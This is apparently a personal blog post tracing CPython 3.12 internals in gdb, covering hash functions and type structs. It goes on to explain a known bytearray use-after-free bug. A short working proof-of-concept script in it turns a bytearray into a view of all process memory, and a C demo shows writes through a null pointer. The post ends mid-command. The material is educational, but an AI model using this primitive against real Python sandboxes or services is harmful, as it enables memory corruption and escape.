---
layout: post
title: cpython deep dive
date: 2025-10-19 01:40:00 +0800
---

recommended listening for this blog post is [blew by nirvana at live and loud, seattle 1993](https://www.youtube.com/watch?v=QVlo81A5mHc)

i just spent like 30 hours straight looking through python internals here is a blog post about it. the impetus behind this is bc while i was doing my uni proj, i wanted to make use of some neat tricks i learned to improve performance. one of these tricks was a python library that implements a LRU cache, `functools`: it gives you a decorator that you can just chuck onto any given function and it will automatically implement a LRU cache for you.

### preamble on hashes

the curious thing is that if you put in an unhashable type as one of your args, it silently fails:

```py
>>> import functools
>>> @functools.lru_cache
... def a(b):
...     return b
... 
>>> a([10])
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: unhashable type: 'list'
```

as we all probably know, lists are unhashable bc they are mutable. this also means that their `__hash__` method is `None`'d out:

```py
>>> print([].__hash__)
None
```

compare / contrast this w/ actually hashable datatypes, such as `int`, `str,` `bool`:

```py
>>> int(1).__hash__
<method-wrapper '__hash__' of int object at 0x1718c18>
>>> 'abc'.__hash__
<method-wrapper '__hash__' of str object at 0x1658c18>
>>> bool(True).__hash__
<method-wrapper '__hash__' of bool object at 0x15ff7a8>
```

and, ofc, tuples:

```py
>>> (1,).__hash__
<method-wrapper '__hash__' of tuple object at 0x7f57f8a364d0>
```

but that got me thinking: ok what else is immutable. most classes are immutable, right?

```py
>>> dict.__hash__()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'NoneType' object is not callable
```

the `dict` class doesn't have a hash method either. meaning that, e.g., we wouldn't be able to put the `dict` class object into a set, for example:

```py
>>> {dict}
{<class dict>}
>>> {dict, []}
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: unhashable type: 'list'
```

huh what the fuck lol

so! the `dict` here is not actually a `dict` instance - it is a _type_ instance:

```py
>>> hash(dict)
5921777808592
>>> type(dict)
<class 'type'>
```

and since `type` instances are immutable, they also have valid hash functions. so this got me thinking: how is this stuff actually implemented, under the hood? because some of the hash values have _wildly_ different ranges for diff datatypes:

```c
>>> hex(hash("abc"))
'-0x3723683767df2c04'
>>> hex(hash(100))
'0x64'
>>> hex(hash(dict))
'0x562c57674d0'
```

the implication of this is that each `hash` function actually has its own underlying implementation wrt to C internals. so, let's look at the cpython internals.

brief aside: this is something that people dont really ever have any reason to do, ive been programming in python for like what, 7 years, and never have i needed to understand the actual source behind python, which has its upsides and downsides. upside being (i _deign_ to use this annoying SWE phrase but) python 'just works' you'll never have to worry about it segfaulting or anything. downside being you'll never know how memory works because python does it all for you. 

anyways let's look at the implementations. here's the implementation for `long_hash`, which processes hashes for `int | bool`:

```c
static Py_hash_t
long_hash(PyObject *obj)
{
    PyLongObject *v = (PyLongObject *)obj;
    Py_uhash_t x;
    Py_ssize_t i;
    int sign;

    if (_PyLong_IsCompact(v)) {
        x = (Py_uhash_t)_PyLong_CompactValue(v);
        if (x == (Py_uhash_t)-1) {
            x = (Py_uhash_t)-2;
        }
        return x;
    }
    i = _PyLong_DigitCount(v);
    sign = _PyLong_NonCompactSign(v);

    // unroll first digit
    Py_BUILD_ASSERT(PyHASH_BITS > PyLong_SHIFT);
    assert(i >= 1);
    --i;
    x = v->long_value.ob_digit[i];
    assert(x < PyHASH_MODULUS);

#if PyHASH_BITS >= 2 * PyLong_SHIFT
    // unroll second digit
    assert(i >= 1);
    --i;
    x <<= PyLong_SHIFT;
    x += v->long_value.ob_digit[i];
    assert(x < PyHASH_MODULUS);
#endif

    while (--i >= 0) {
        x = ((x << PyLong_SHIFT) & _PyHASH_MODULUS) |
            (x >> (_PyHASH_BITS - PyLong_SHIFT));
        x += v->long_value.ob_digit[i];
        if (x >= _PyHASH_MODULUS)
            x -= _PyHASH_MODULUS;
    }
    x = x * sign;
    if (x == (Py_uhash_t)-1)
        x = (Py_uhash_t)-2;
    return (Py_hash_t)x;
}
```

so this is, as professional developers say, 'fucking cibai long sia'. but we can see various details here: the `long_hash` func takes a `PyObject` ptr and outputs a `Py_hash_t` obj.

```c
PyTypeObject PyLong_Type = {
    PyVarObject_HEAD_INIT(&PyType_Type, 0)
    "int",                                      /* tp_name */
    offsetof(PyLongObject, long_value.ob_digit),  /* tp_basicsize */
    sizeof(digit),                              /* tp_itemsize */
    long_dealloc,                               /* tp_dealloc */
    0,                                          /* tp_vectorcall_offset */
    0,                                          /* tp_getattr */
    0,                                          /* tp_setattr */
    0,                                          /* tp_as_async */
    long_to_decimal_string,                     /* tp_repr */
    &long_as_number,                            /* tp_as_number */
    0,                                          /* tp_as_sequence */
    0,                                          /* tp_as_mapping */
    long_hash,                                  /* tp_hash */
    0,                                          /* tp_call */
    0,                                          /* tp_str */
    PyObject_GenericGetAttr,                    /* tp_getattro */
    0,                                          /* tp_setattro */
    0,                                          /* tp_as_buffer */
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_BASETYPE |
        Py_TPFLAGS_LONG_SUBCLASS |
        _Py_TPFLAGS_MATCH_SELF,               /* tp_flags */
    long_doc,                                   /* tp_doc */
    0,                                          /* tp_traverse */
    0,                                          /* tp_clear */
    long_richcompare,                           /* tp_richcompare */
    0,                                          /* tp_weaklistoffset */
    0,                                          /* tp_iter */
    0,                                          /* tp_iternext */
    long_methods,                               /* tp_methods */
    0,                                          /* tp_members */
    long_getset,                                /* tp_getset */
    0,                                          /* tp_base */
    0,                                          /* tp_dict */
    0,                                          /* tp_descr_get */
    0,                                          /* tp_descr_set */
    0,                                          /* tp_dictoffset */
    0,                                          /* tp_init */
    0,                                          /* tp_alloc */
    long_new,                                   /* tp_new */
    PyObject_Free,                              /* tp_free */
    .tp_vectorcall = long_vectorcall,
    .tp_version_tag = _Py_TYPE_VERSION_INT,
};
```

this `long_hash` func is then used in our definition of the `PyLong_Type` struct. now is the time i plug my [good buddy azazo](https://blog.azazo.me/posts/sieberr25/)'s writeups on a ctf we did together regarding monkeypatching the `long_richcompare` attr. it is very cool and very well done go check it out my good buddy azazo is a very smart fella

anyways `long_hash`. im not gonna get into the implementation details actually you get the idea. different hash implementation for different data types, yup yup

we can also see that the generic implementation just takes the predefined field in the `tp_hash` field of the given `PyTypeObject` struct.

```c
Py_hash_t
PyObject_Hash(PyObject *v)
{
    PyTypeObject *tp = Py_TYPE(v);
    if (tp->tp_hash != NULL)
        return (*tp->tp_hash)(v);
    if (!_PyType_IsReady(tp)) {
        if (PyType_Ready(tp) < 0)
            return -1;
        if (tp->tp_hash != NULL)
            return (*tp->tp_hash)(v);
    }
    return PyObject_HashNotImplemented(v);
}
```

### hash functions get called a lot actually oops

ok now this is about the time where i underwent a further diversion from my initial task by compiling python 3.12 from source w/ debug symbols because i just wanted to tinker more, this started w/ me putting a breakpoint on `long_hash` and seeing that this function actually gets called multiple times on initialization:

```c
   3293       Py_TYPE(self)->tp_free(self);
   3294   }
   3295   
   3296   static Py_hash_t
   3297   long_hash(PyLongObject *v)
*->3298   {
   3299       Py_uhash_t x;
   3300       Py_ssize_t i;
   3301       int sign;
   3302   
   3303       if (_PyLong_IsCompact(v)) {

   ---

[*#0] 0x555555717b7a <long_hash>
[ #1] 0x555555739f08 <PyObject_Hash+0x1a>
[ #2] 0x55555572a8d9 <_PyDict_SetItem_Take2+0x4c>
[ #3] 0x55555572aa21 <PyDict_SetItem+0x49>
[ #4] 0x5555557553ba <add_subclass+0x68>
[ #5] 0x5555557555aa <type_ready_add_subclasses+0x77>
[ #6] 0x55555575fee6 <type_ready+0xeb>
[ #7] 0x55555576005b <_PyStaticType_InitBuiltin+0xc2>
[ #8] 0x55555573a2cf <_PyTypes_InitTypes+0x8d>
[ #9] 0x55555583ea3e <pycore_init_types+0x1a>
[...]
gef>
```

inspecting the backtrace we can see the whole tree of func calls that inevitably culminates in `_PyTypes_InitTypes`. we actually havent even gotten to the repl prompt yet!

anyways so i just spammed `fin` to get to that func call:

```c
   2148   _PyTypes_InitTypes(PyInterpreterState *interp)
   2149   {
   2150       // All other static types (unless initialized elsewhere)
   2151       for (size_t i=0; i < Py_ARRAY_LENGTH(static_types); i++) {
   2152           PyTypeObject *type = static_types[i];
 ->2153           if (_PyStaticType_InitBuiltin(interp, type) < 0) {
   2154               return _PyStatus_ERR("Can't initialize builtin type");
   2155           }
   2156           if (type == &PyType_Type) {
   2157               // Sanitify checks of the two most important types
   2158               assert(PyBaseObject_Type.tp_base == NULL);


[*#0] 0x55555573a2cf <_PyTypes_InitTypes+0x8d>
[ #1] 0x55555583ea3e <pycore_init_types+0x1a>
[ #2] 0x55555583efa7 <pycore_interp_init+0x92>
[ #3] 0x55555583f18d <pyinit_config+0x92>
[ #4] 0x555555846212 <pyinit_core+0x109>
[ #5] 0x5555558462ef <Py_InitializeFromConfig+0x8a>
[ #6] 0x55555587187e <pymain_init+0x145>
[ #7] 0x555555871939 <pymain_main+0x14>
[ #8] 0x5555558719ca <Py_BytesMain+0x2b>
[ #9] 0x555555655772 <main+0x9>
```

so this func takes two args: an `interp` struct and a `type` struc:

```c
gef>  p interp
$17 = (PyInterpreterState *) 0x555555c132b0 <_PyRuntime+92368>
gef> p type
$18 = (PyTypeObject *) 0x555555b0f060 <PyAsyncGen_Type>
```

afaict `_PyRuntime` is the global state for .. the entire python interpreter? not sure. but we can see that we're initializing a `PyAsyncGen_Type`, and sure enough if we peek at the struct fields:

```c
gef> p *type
$19 = {
  ob_base = {
    ob_base = {
      {
        ob_refcnt = 0xffffffff,
        ob_refcnt_split = {
          [0x0] = 0xffffffff,
          [0x1] = 0x0
        }
      },
      ob_type = 0x555555b1b460 <PyType_Type>
    },
    ob_size = 0x0
  },
  tp_name = 0x5555558e79ce "async_generator",
  tp_basicsize = 0x90,
  tp_itemsize = 0x8,
  tp_dealloc = 0x55555570367b <gen_dealloc>,
  tp_vectorcall_offset = 0x0,
  tp_getattr = 0x0,
  tp_setattr = 0x0,
  tp_as_async = 0x555555b0f200 <async_gen_as_async>,
  tp_repr = 0x555555703477 <async_gen_repr>,
  tp_as_number = 0x0,
  tp_as_sequence = 0x0,
  tp_as_mapping = 0x0,
  tp_hash = 0x55555583df54 <_Py_HashPointer>,
  tp_call = 0x0,
  tp_str = 0x55555574ca53 <object_str>,
  tp_getattro = 0x55555573c683 <PyObject_GenericGetAttr>,
  tp_setattro = 0x55555573cbc6 <PyObject_GenericSetAttr>,
  tp_as_buffer = 0x0,
  tp_flags = 0x85182,
  tp_doc = 0x0,
  tp_traverse = 0x5555557033f9 <async_gen_traverse>,
  tp_clear = 0x0,
  tp_richcompare = 0x55555574ff4c <object_richcompare>,
  tp_weaklistoffset = 0x10,
  tp_iter = 0x0,
  tp_iternext = 0x0,
  tp_methods = 0x555555b0f220 <async_gen_methods>,
  tp_members = 0x555555b0f8c0 <async_gen_memberlist>,
  tp_getset = 0x555555b0f920 <async_gen_getsetlist>,
  tp_base = 0x555555b1b2c0 <PyBaseObject_Type>,
  tp_dict = 0x0,
  tp_descr_get = 0x0,
  tp_descr_set = 0x0,
  tp_dictoffset = 0x0,
  tp_init = 0x55555574ef47 <object_init>,
  tp_alloc = 0x555555756084 <PyType_GenericAlloc>,
  tp_new = 0x0,
  tp_free = 0x555555874b22 <PyObject_GC_Del>,
  tp_is_gc = 0x0,
  tp_bases = 0x7ffff7bd03c0,
  tp_mro = 0x7ffff7bd0410,
  tp_cache = 0x0,
  tp_subclasses = 0x3,
  tp_weaklist = 0x0,
  tp_del = 0x0,
  tp_version_tag = 0x3,
  tp_finalize = 0x555555704423 <_PyGen_Finalize>,
  tp_vectorcall = 0x0,
  tp_watched = 0x0
}
```

aand if we look at this a bit closer...

```c
tp_hash = 0x55555583df54 <_Py_HashPointer>,
```

awesome! so this struct actually gets initialized w/ a `tp_hash` value that just points to this `_Py_HashPointer` func. and if we look at the source for that func:

```c
147	Py_hash_t
148	_Py_HashPointer(const void *p)
149	{
150	   Py_hash_t x = _Py_HashPointerRaw(p);
151	   if (x == -1) {
152	       x = -2;
153	   }
gef> 
154	   return x;
155	}
```

.. ok whatever now can you give me the info

```c
138	_Py_HashPointerRaw(const void *p)
139	{
140	   size_t y = (size_t)p;
141	   /* bottom 3 or 4 bits are likely to be 0; rotate y by 4 to avoid
142	      excessive hash collisions for dicts and sets */
143	   y = (y >> 4) | (y << (8 * SIZEOF_VOID_P - 4));
144	   return (Py_hash_t)y;
145	}
```

yaa okay more like it. so, as we might predict, the `hash()` function for classes like `dict` or, well, `async_gen`:

```py
>>> type(a)
<class 'async_generator'>
>>> hash(a)
8796083803118
>>> a
<async_generator object agen at 0x7ffff7353ee0>
>>> hex(hash(a))
'0x7ffff7353ee'
```

the underlying implementation for this is to just return the pointer to the class instance in memory (plus a ROR). this makes sense - while `long_hash` can leverage the numerical values of the long within its hash function, there's no nice convenient value that is shared from all `type` objects like this in the same way all numerical data types have a numerical data value. so, we can just return the pointer. 

let's hop into gdb and just print it:

```c
gef>  p (PyObject *)0x7ffff7353ee0
$2 = (PyObject *) 0x7ffff7353ee0
gef> p ((PyObject *)0x7ffff7353ee0)->ob_type
$3 = (PyTypeObject *) 0x555555b0f060 <PyAsyncGen_Type>
```

cool! now, if we try to print the hash of `dict` we'll see that it's actually markedly lower, it's in an entirely different area of memory:

```py
>>> hex(hash(dict))
'0x555555b13fe'
```

peeking at `info proc mappings` we can see that we're just in the binary itself:

```py
Start Addr         End Addr           Size               Offset             Perms File 
0x0000555555554000 0x0000555555654000 0x100000           0x0                r--p  /usr/local/bin/python3.12d 
0x0000555555654000 0x00005555558e0000 0x28c000           0x100000           r-xp  /usr/local/bin/python3.12d 
0x00005555558e0000 0x0000555555a85000 0x1a5000           0x38c000           r--p  /usr/local/bin/python3.12d 
0x0000555555a85000 0x0000555555b00000 0x7b000            0x531000           r--p  /usr/local/bin/python3.12d 
0x0000555555b00000 0x0000555555c71000 0x171000           0x5ac000           rw-p  /usr/local/bin/python3.12d
```

again, this makes sense - python will want to put dynamically generated objects (like lists generated on runtime e.g.) in the pyheap or somewhere else, but these static `type` definitions can just stay fixed in the binary itself. let's inspect the struct:

```c
gef> p *((PyTypeObject *)0x555555b13fe0)
$4 = {
  ob_base = {
    ob_base = {
      {
        ob_refcnt = 0xffffffff,
        ob_refcnt_split = {
          [0x0] = 0xffffffff,
          [0x1] = 0x0
        }
      },
      ob_type = 0x555555b1b460 <PyType_Type>
    },
    ob_size = 0x0
  },
  tp_name = 0x5555558edfd2 "dict",
  tp_basicsize = 0x30,
  tp_itemsize = 0x0,
  tp_dealloc = 0x55555572da02 <dict_dealloc>,
  tp_vectorcall_offset = 0x0,
  tp_getattr = 0x0,
  tp_setattr = 0x0,
  tp_as_async = 0x0,
  tp_repr = 0x55555572928c <dict_repr>,
  tp_as_number = 0x555555b147a0 <dict_as_number>,
  tp_as_sequence = 0x555555b148c0 <dict_as_sequence>,
  tp_as_mapping = 0x555555b14910 <dict_as_mapping>,
  tp_hash = 0x555555739ec1 <PyObject_HashNotImplemented>,
  tp_call = 0x0,
  tp_str = 0x55555574ca53 <object_str>,
  tp_getattro = 0x55555573c683 <PyObject_GenericGetAttr>,
  tp_setattro = 0x55555573cbc6 <PyObject_GenericSetAttr>,
  tp_as_buffer = 0x0,
  tp_flags = 0x20485542,
  tp_doc = 0x555555944480 <dictionary_doc> "dict() -> new empty dictionary\ndict(mapping) -> new dictionary initialized from a mapping object's\n    (key, value) pairs\ndict(iterable) -> new dictionary initialized as if via:\n    d = {}\n    for k, v in iterable:\n        d[k] = v\ndict(**kwargs) -> new dictionary initialized with the name=value pairs\n    in the keyword argument list.  For example:  dict(one=1, two=2)",
  tp_traverse = 0x55555572374b <dict_traverse>,
  tp_clear = 0x55555572b9b0 <dict_tp_clear>,
  tp_richcompare = 0x55555572850b <dict_richcompare>,
  tp_weaklistoffset = 0x0,
  tp_iter = 0x5555557256f0 <dict_iter>,
  tp_iternext = 0x0,
  tp_methods = 0x555555b14180 <mapp_methods>,
  tp_members = 0x0,
  tp_getset = 0x0,
  tp_base = 0x555555b1b2c0 <PyBaseObject_Type>,
  tp_dict = 0x0,
  tp_descr_get = 0x0,
  tp_descr_set = 0x0,
  tp_dictoffset = 0x0,
  tp_init = 0x55555572d56e <dict_init>,
  tp_alloc = 0x555555755fb5 <_PyType_AllocNoTrack>,
  tp_new = 0x555555727c24 <dict_new>,
  tp_free = 0x555555874b22 <PyObject_GC_Del>,
  tp_is_gc = 0x0,
  tp_bases = 0x7ffff7bd2300,
  tp_mro = 0x7ffff7bd2350,
  tp_cache = 0x0,
  tp_subclasses = 0x1e,
  tp_weaklist = 0x0,
  tp_del = 0x0,
  tp_version_tag = 0x1e,
  tp_finalize = 0x0,
  tp_vectorcall = 0x55555572d35b <dict_vectorcall>,
  tp_watched = 0x0
}
```

eh... eh wait wtf..

```c
  tp_hash = 0x555555739ec1 <PyObject_HashNotImplemented>,
```

needless to say this confused me for a little bit - we can clearly see that the `dict` class is indeed hashable, we can store it in sets. but here, it says the hash func is not implemented? how? why?

this was covered earlier, but just to reiterate: its just that this specific value refers to the actual hashability of a `dict` instance, not the `dict` class itslf. instances arent hashable, so you cannot compute the hashes of individual dicts. but, the `dict` _class_ is just an instance of an object, and objects do have a defined `tp_hash` field, which defaults to the `Py_HashPointer` func we saw earlier.

### pwning 

ok anyways enough nonsense. i am learning pwn so let's. let's uh.. let's pwn some shit huh. let's pwn some shit. typically if you want to do memory fuckery in python you'd have to do some nonsense w/ the `ctypes` module, but a. i don't know how to use that module and b. i specifically used python 3.12 bc of this UAF vuln present in this python version, as detailed in this [issue](https://github.com/python/cpython/issues/91153)
```py
[-$ cat uaf.py
class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = B()

print(len(memory))

[-$ python uaf.py   
72057594037927936
```

so yes our `memory` var is indeed just. all of the memory that python is running in. here is a good explanation of this bug from the good folks over at [maple bacon](https://maplebacon.org/2024/02/dicectf2024-irs/), but let's actually really _look through how this shit works_, rigorously.

the crux of the uaf is this nonsense w/ `bytearray_ass_subscript`. - this func is where the vulnerability lies. so, i place a breakpoint at `bytearray_ass_subscript` and start stepping thru:
```c

    587       return 0;
    588   }
    589   
    590   static int
    591   bytearray_ass_subscript(PyByteArrayObject *self, PyObject *index, PyObject *values)
*-> 592   {
    593       Py_ssize_t start, stop, step, slicelen, needed;
    594       char *buf, *bytes;
    595       buf = PyByteArray_AS_STRING(self);
    596   
    597       if (_PyIndex_Check(index)) {

[*#0] 0x5555556df279 <bytearray_ass_subscript>
[ #1] 0x5555556d38f7 <PyObject_SetItem+0x49>
[ #2] 0x5555557dda2f <_PyEval_EvalFrameDefault+0x3620>
[ #3] 0x5555557ef35e <_PyEval_EvalFrame+0x1d>
[ #4] 0x5555557ef474 <_PyEval_Vector+0xd3>
[ #5] 0x5555557ef524 <PyEval_EvalCode+0xa1>
[ #6] 0x55555584b9e6 <run_eval_code_obj+0x51>
[ #7] 0x55555584baaf <run_mod+0x67>
[ #8] 0x55555584bb77 <pyrun_file+0x84>
[ #9] 0x55555584e8ff <_PyRun_SimpleFileObject+0x237>
```

we can see a few args get passed in here - `*self`, `*index`, `*values`. let's actually see what these args are. intuitively we'd expect `*self` to be a ptr to the bytearray, `*index` to be a ptr to a python `long` with the value of our index, and the `value` being the actual value we set to. so let's see.

```c
gef> p *self
$6 = {
  ob_base = {
    ob_base = {
      {
        ob_refcnt = 0x2,
        ob_refcnt_split = {
          [0x0] = 0x2,
          [0x1] = 0x0
        }
      },
      ob_type = 0x555555b01560 <PyByteArray_Type>
    },
    ob_size = 0x38
  },
  ob_alloc = 0x39,
  ob_bytes = 0x7ffff7750c40 "",
  ob_start = 0x7ffff7750c40 "",
  ob_exports = 0x0
}
gef> p *index
$7 = {
  {
    ob_refcnt = 0xffffffff,
    ob_refcnt_split = {
      [0x0] = 0xffffffff,
      [0x1] = 0x0
    }
  },
  ob_type = 0x555555b129e0 <PyLong_Type>
}
gef> p *values
$8 = {
  {
    ob_refcnt = 0x1,
    ob_refcnt_split = {
      [0x0] = 0x1,
      [0x1] = 0x0
    }
  },
  ob_type = 0x555555d06500
}
```

#yup all seems corright. actually we can't _see_ the value of `index` we can only see irrelevant struct fields like `ob_refcnt` (this is, afaict, for python's garbage collector to figure out whether or not the object shld be freed or not). we can just cast that ptr to the correct `PyLong_Type` to see the other values:

```c
gef> p (*(PyLongObject *)index)
$9 = {
  ob_base = {
    {
      ob_refcnt = 0xffffffff,
      ob_refcnt_split = {
        [0x0] = 0xffffffff,
        [0x1] = 0x0
      }
    },
    ob_type = 0x555555b129e0 <PyLong_Type>
  },
  long_value = {
    lv_tag = 0x8,
    ob_digit = {
      [0x0] = 0x17
    }
  }
}
```

remember that this `bytearray_ass_subscript` call corresponds to this line in our python source:

```py
uaf[23] = B()
```

we can see that `0x17 == 23`, so it checks out. but we also want to verify that our `values` ptr corresponds to this `B()` class instance.

```c
gef> p *((PyTypeObject *)((PyObject *)values)->ob_type)
$11 = {
  ob_base = {
    ob_base = {
      {
        ob_refcnt = 0x5,
        ob_refcnt_split = {
          [0x0] = 0x5,
          [0x1] = 0x0
        }
      },
      ob_type = 0x555555b1b460 <PyType_Type>
    },
    ob_size = 0x0
  },
  tp_name = 0x555555c106c0 <_PyRuntime+81120> "B", <- #YUPPPP
  tp_basicsize = 0x10,
```

ok yea cool beans. im gonna skip forward and actually show the end result (ie) the actual `memory` bytearray that we corrupt after leveraging the uaf:

```c
gef> p *((PyByteArrayObject *)0x7ffff76ddeb0)
$5 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x5555559bb760 <PyByteArray_Type>
    },
    ob_size = 0x100000000000000
  },
  ob_alloc = 0x0,
  ob_bytes = 0x0,
  ob_start = 0x0,
  ob_exports = 0x0
}
```

### quick diversion - whats in a bytearray struct?

to better explain why the above struct fields indicate something amiss, lets initialize a normal bytearray to compare and contrast struct fields. even just eyepowering rn you can kind of see that there is some shit thats going on (why is `ob_size` so big?) heres me after defining `z = bytearray('skibidi'.encode())`:

```c
gef> p *((PyByteArrayObject *)0x7ffff76ddf30)
$1 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x5555559bb760 <PyByteArray_Type>
    },
    ob_size = 0x7
  },
  ob_alloc = 0x8,
  ob_bytes = 0x7ffff7c48160 "skibidi",
  ob_start = 0x7ffff7c48160 "skibidi",
  ob_exports = 0x0
}
```

we can see that `ob_start` is actually just a ptr to the bytes in memory:

```c
gef> x/64g 0x7ffff7c48160
0x7ffff7c48160:	0x0069646962696b73	0x0000555555ba5170
```

meaning.. that if `ob_start` is nulled out and `ob_size` is arbitrary large, we essentially have a bytearray that starts at the _beginning_ of addressable memory and can be arbitrarily accessed however we want

if you think about it this is kind of like when you fuck w/ `malloc()` in C such that it returns a nullptr! consider the following poc

```c
#include <stdlib.h>
#include <stdio.h>

int main(void) {
  char *memory = malloc(0xffffffffffffff);
  printf("memory alloc'd at %p\n", memory);
  return 0;
```

```c
[-(navi's curette)-[/tmp]
[-$ ./poc
memory alloc'd at (nil)
```

of course, c arrays don't inherently have bounds-checking meaning you can just arbitrarily access any memory you want if you can write to a nullptr:

```c
#include <stdlib.h>
#include <stdio.h>

int main(void) {
  char *memory = malloc(0xffffffffffffff);
  int overwrite_me = 0x10;
  printf("memory alloc'd at %p\n", memory);
  memory[(unsigned long long) &overwrite_me] = 0x20;
  printf("overwrite_me val: 0x%02x", overwrite_me);
  return 0;
}
```


```
[-(navi's curette)-[/tmp]
[-$ ./poc
memory alloc'd at (nil)
overwrite_me val: 0x20
```

so, this is why having write access to a nullptr is dangerous! but keep in mind, python bytearrays _do_ have OOB checks, which is why we need to set the `ob_size` cnt with our UAF as well.

### back to the uaf nonsense

the UAF bug relies in how `PyByteArray_AS_STRING` _retains_ a ptr to a buffer after it gets freed. essentially, we create a buffer `uaf` that's the exact size of a `PyByteArrayObject` struct in memory (56 bytes), and then free it.

then, we create another bytearray named `memory`. this ends up _overlapping_ w our previously freed buffer `uaf`, and so, we are free to write to the struct metadata values as we please!

however, we don't actually have any 'direct' writes, meaning we need to leverage this nonsense w/ the `__index__` func to perform our write for us. see here, in the `bytearray_ass_subscript` func:

```c
buf[i] = (char)ival
```

this is our freed buf (which now overlaps w/ our `memory` struct)!

```c
gef> p *(PyByteArrayObject *) buf
$5 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x5555559bb760 <PyByteArray_Type>
    },
    ob_size = 0x0
  },
  ob_alloc = 0x0,
  ob_bytes = 0x0,
  ob_start = 0x0,
  ob_exports = 0x0
}
```

and once that char assignment executes... 

```c
gef> p *(PyByteArrayObject *) buf
$6 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x5555559bb760 <PyByteArray_Type>
    },
    ob_size = 0x100000000000000
  },
  ob_alloc = 0x0,
  ob_bytes = 0x0,
  ob_start = 0x0,
  ob_exports = 0x0
}
```

we have now written to `ob_size`! woohoo! we also have `ob_start` as a null pointer! woohoo!

a few restrictions w/ this uaf is we only have a char's worth of overwriting, and this char is the result of our bytearray's `__index__` func. `ival` gets written to here:

```c
610	       if (values && !_getbytevalue(values, &ival)) {
611	           return -1;
612	       }
```

and we can just break on `_getbytevalue` and see how that ends up 'executing' our overridden `__index__` attr.

```c
24	_getbytevalue(PyObject* arg, int *value)
25	{
26	   int overflow;
27	   long face_value = PyLong_AsLongAndOverflow(arg, &overflow);
28	
29	   if (face_value == -1 && PyErr_Occurred()) {
30	       *value = -1;
31	       return 0;
gef> 
32	   }
33	   if (face_value < 0 || face_value >= 256) {
34	       /* this includes an overflow in converting to C long */
35	       PyErr_SetString(PyExc_ValueError, "byte must be in range(0, 256)");
36	       *value = -1;
37	       return 0;
38	   }
39	
40	   *value = face_value;
41	   return 1;
gef>
```

`_getbytevalue()` takes in a `value` intptr, and then we write `face_value` into that int ptr. `face_value` is further derived from `PyLong_AsLongAndOverflow`, and somewhere in that function we get:

```c
    469   
    470       if (PyLong_Check(vv)) {
    471           v = (PyLongObject *)vv;
    472       }
    473       else {
 -> 474           v = (PyLongObject *)_PyNumber_Index(vv);
    475           if (v == NULL)
    476               return -1;
    477           do_decref = 1;
    478       }
    479
```

so honestly you could just take this as is and be happy happy alr. this `_PyNumber_Index` value clearly just calls the `__index__` method we define somewhere down the line and returns it as a `long`. this is a satisfactory enough level of detail for most people, but i am not most people, hence:

### a psychotically in-depth breakdown of how python bytecode is loaded and interpreted in memory which took me around 10 hours to figure out 

checking the `_PyNumber_Index` func we see this

```c
PyObject *result = Py_TYPE(item)->tp_as_number->nb_index(item);
```

what this does is the following:

- gets the TYPE of our item (in our case, our class)
- gets the function that 'retrieves' the `nb_index` attr (aka, our `__index__`) atr we defined in our class
- calls it!

how does it call it?

```c
   7503   static PyObject *
   7504   slot_nb_index(PyObject *self)
   7505   {
*->7506       PyObject *stack[1] = {self};
   7507       return vectorcall_method(&_Py_ID(__index__), stack, 1);
   7508   }
```

`slot_nb_index` is the c func that retrieves our `__index__` method and calls it. i will elaborate further on `vectorcall_method` (it eventually leads to the C-based interpreter for python bytecode) , found in the `.__code__.co_code` attrs of most funcs, as so:

```py
>>> func = lambda x: x+x
>>> func.__code__.co_code
b'\x95\x00X\x00-\x00\x00\x00$\x00'
```

so, let's just go through how we would actually _access_ the bytecode, just to see. first we want to make sure we're at the `vectorcall_method` frame

```c
gef> bt
#0  vectorcall_method (name=0x555555ac8e08 <_PyRuntime+26920>, args=0x7fffffffd8c8, nargs=0x1)
    at Objects/typeobject.c:1668
#1  slot_nb_index (self=0x7ffff76da4d0) at Objects/typeobject.c:7507
#2  0x000055555567db82 in _PyNumber_Index (item=<optimized out>) at Objects/abstract.c:1425
#3  0x00005555556db525 in PyLong_AsLongAndOverflow (vv=vv@entry=0x7ffff76da4d0, 
    overflow=overflow@entry=0x7fffffffd958) at Objects/longobject.c:474
#4  0x000055555568e853 in _getbytevalue (arg=0x7ffff76da4d0, value=<synthetic pointer>)
    at Objects/bytearrayobject.c:27
#5  bytearray_ass_subscript (self=0x7ffff7
```

and let's just check our locals here

```c
gef> info locals
unbound = 0x1
self = 0x7ffff76da4d0
func = 0x7ffff76d4900
```

we can see _func_ is the thing we want to execute, and it's just a `PyFunctionObject`

```c
gef> p *(PyObject*) func
$74 = {
  ob_refcnt = 0x3,
  ob_type = 0x5555559ca1c0 <PyFunction_Type>
}
```

and of course we can just deref it

```c
gef> p *(PyFunctionObject*) func
$75 = {
  ob_base = {
    ob_refcnt = 0x3,
    ob_type = 0x5555559ca1c0 <PyFunction_Type>
  },
  func_globals = 0x7ffff7cbaa80,
  func_builtins = 0x7ffff7c54e40,
  func_name = 0x7ffff7bc4ab0,
  func_qualname = 0x7ffff76d9e70,
  func_code = 0x7ffff7c84030,
  func_defaults = 0x0,
  func_kwdefaults = 0x0,
  func_closure = 0x0,
  func_doc = 0x5555559cfe80 <_Py_NoneStruct>,
  func_dict = 0x0,
  func_weakreflist = 0x0,
  func_module = 0x7ffff7cbaab0,
  func_annotations = 0x0,
  vectorcall = 0x55555569e480 <_PyFunction_Vectorcall>,
  func_version = 0x0
}
```

and so on and so forth. `func_code` is the attr we want. just as a high level understanding of things, if we actually wanted to do this _on_ the python level, it's so much easier because we can directly get attributes like so:

```py
class B():
  def __index__():
      ....

z = B().__index__.__func__.__code__.co_code # < this will return the byte object
```

but whatever

from here on out it's just chaining derefs and derefs until we get to the attr we want. we go from a `PyFunctionObject` to a `PyCodeObject` to a `PyBytesObject`, and each takes its own deref and cast and so on and so forth, but eventually, we are able to _see_ the bytecode in memory!

```c
gef> x/64x &(*(PyBytesObject*) (*(PyCodeObject*) (*(PyFunctionObject*)func)->func_code)->_co_code)->ob_sval
